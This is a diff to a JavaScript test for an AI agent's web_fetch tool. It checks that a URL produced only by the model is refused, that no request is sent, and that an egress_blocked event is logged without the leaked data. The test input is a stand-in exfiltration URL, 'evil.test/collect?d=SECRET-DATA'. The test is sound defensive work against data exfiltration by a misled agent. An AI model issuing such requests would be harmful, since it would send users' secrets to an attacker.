@@ -182,10 +182,11 @@ test('web_fetch tool: a URL only the model produced is refused with url_not_in_p
     const out = await fetchTool('https://evil.test/collect?d=SECRET-DATA', PROV)
     assert.deepEqual(JSON.parse(out.resultText), { error: 'url_not_in_prior_context' })
     assert.equal(request.mock.callCount(), 0, 'no socket may be opened')
-    const log = lines.join('\n')
-    assert.match(log, /"surface":"web_fetch"/)
-    assert.match(log, /evil\.test/)
-    assert.doesNotMatch(log, /SECRET-DATA|collect/)
+    const ev = lines.map((l) => JSON.parse(JSON.parse(l).msg)).filter((e) => e.event === 'egress_blocked')
+    assert.equal(ev.length, 1)
+    assert.equal(ev[0].surface, 'web_fetch')
+    assert.deepEqual(ev[0].hosts, ['evil.test'])
+    assert.doesNotMatch(lines.join('\n'), /SECRET-DATA|collect/)
   } finally {
     setLogWriter(prev)
   }
